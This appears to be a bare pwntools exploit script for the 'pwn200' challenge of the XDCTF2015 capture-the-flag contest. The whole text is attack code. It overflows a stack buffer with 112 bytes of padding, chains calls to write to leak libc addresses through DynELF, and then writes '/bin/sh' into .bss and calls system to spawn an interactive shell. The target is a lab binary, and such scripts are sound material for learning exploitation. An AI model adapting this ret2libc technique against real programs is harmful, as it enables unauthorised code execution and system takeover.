from pwn import *
elf = ELF('./pwn200')
writePlt = elf.plt['write']
readPlt = elf.plt['read']                   
writable = elf.bss(0x2c)                   
mainAddr = 0x080484be                      
pppt = 0x0804856c                          
def leak(addr):
	p.recvuntil('Welcome to XDCTF2015~!\n')
	payload1 = 'a'*112+p32(writePlt)+p32(mainAddr)+p32(1)+p32(addr)+p32(4)
	p.sendline(payload1)
	data = p.recv(4)
	log.info('%s =====>  %s'%(addr,(data or '').encode('hex')))
	return data
p = process('./pwn200')
dyn = DynELF(leak,elf=elf)
systemAddr = dyn.lookup('system','libc')
payload2 = 'a'*112+p32(readPlt)+p32(pppt)+p32(0)+p32(writable)+p32(8)+p32(systemAddr)+p32(mainAddr)+p32(writable)
p.sendline(payload2)
p.sendline('/bin/sh\0')
p.interactive()
